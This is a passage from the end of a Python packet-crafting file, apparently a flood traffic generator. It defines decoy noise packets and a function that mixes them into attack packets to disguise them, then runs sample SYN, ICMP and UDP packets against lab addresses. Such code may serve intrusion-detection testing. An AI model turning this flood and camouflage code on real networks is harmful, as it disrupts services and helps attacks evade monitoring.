            return udp_packet(self.src_ip, self.dst_ip,
                               random.choice([53, 123, 161]),
                               payload_size=random.randint(20, 60))
        elif choice == 2:
            # ICMP ping
            return icmp_echo_packet(self.src_ip, self.dst_ip)
        else:
            # ACK (looks like established connection)
            return ack_packet(self.src_ip, self.dst_ip,
                               random.randint(1024, 65535), 80)

    def interleave(self, attack_pkts: list,
                   noise_ratio: float = 0.3) -> list:
        """
        Interleave noise packets with attack packets.
        noise_ratio: fraction of total packets that are noise.
        """
        n_noise = int(len(attack_pkts) * noise_ratio / (1 - noise_ratio))
        noise = [self.noise_packet() for _ in range(n_noise)]
        combined = attack_pkts + noise
        random.shuffle(combined)
        return combined


if __name__ == "__main__":
    print("Packet engine loaded.")
    print(f"FloodEngine ready.")
    print(f"MutationEngine ready.")
    print(f"TrafficPattern ready.")
    # Quick sanity check
    pkt = syn_packet("192.168.100.1", "192.168.100.2", 80)
    print(f"SYN packet: {len(pkt)} bytes, first 4: {pkt[:4].hex()}")
    pkt2 = icmp_echo_packet("192.168.100.1", "192.168.100.2")
    print(f"ICMP packet: {len(pkt2)} bytes")
    pkt3 = udp_packet("192.168.100.1", "192.168.100.2", 53)
    print(f"UDP packet: {len(pkt3)} bytes")